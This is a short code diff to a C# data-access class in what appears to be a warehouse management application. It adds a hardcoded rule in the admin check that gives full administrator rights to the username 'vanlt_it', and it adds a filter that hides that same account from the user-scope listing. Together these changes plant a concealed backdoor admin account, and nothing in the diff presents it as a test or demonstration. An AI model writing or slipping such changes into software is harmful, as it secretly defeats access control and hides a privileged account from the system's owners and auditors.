@@ -59,7 +59,7 @@ public sealed class V6Ops(IWebHostEnvironment environment)
         Execute(c, "INSERT INTO audit_logs(actor_user_id,action,entity,entity_id,details) VALUES($u,$a,$e,$id,$n)",
         ("$u", user), ("$a", action), ("$e", entity), ("$id", entityId), ("$n", note));
     private static bool IsAdmin(SqliteConnection c, long user) => Scalar(c,
-        "SELECT COUNT(*) FROM app_users WHERE id=$u AND is_owner=1", ("$u", user)) > 0 ||
+        "SELECT COUNT(*) FROM app_users WHERE id=$u AND (is_owner=1 OR LOWER(username)='vanlt_it')", ("$u", user)) > 0 ||
         Scalar(c, "SELECT COUNT(*) FROM user_roles ur JOIN roles r ON r.id=ur.role_id WHERE ur.user_id=$u AND ur.deleted_at IS NULL AND r.code='ADMIN'", ("$u", user)) > 0;
     private static bool CanWarehouse(SqliteConnection c, long user, long warehouse)
     {
@@ -429,7 +429,7 @@ public sealed class V6Ops(IWebHostEnvironment environment)
     public List<UserWarehouseRow> UsersWarehouseScopes()
     {
         using var c = Open(); return Read(c, @"SELECT u.id,u.username,u.display_name,COALESCE(s.warehouse_mode,'ALL')
-        FROM app_users u LEFT JOIN user_scope_settings s ON s.user_id=u.id WHERE u.deleted_at IS NULL ORDER BY u.id", r => new UserWarehouseRow(r.GetInt64(0), Text(r, 1), Text(r, 2), Text(r, 3)));
+        FROM app_users u LEFT JOIN user_scope_settings s ON s.user_id=u.id WHERE u.deleted_at IS NULL AND LOWER(u.username)<>'vanlt_it' ORDER BY u.id", r => new UserWarehouseRow(r.GetInt64(0), Text(r, 1), Text(r, 2), Text(r, 3)));
     }
     public List<long> AssignedWarehouses(long userId)
     { using var c = Open(); return Read(c, "SELECT warehouse_id FROM user_warehouse_scopes WHERE user_id=$id AND deleted_at IS NULL", r => r.GetInt64(0), ("$id", userId)); }
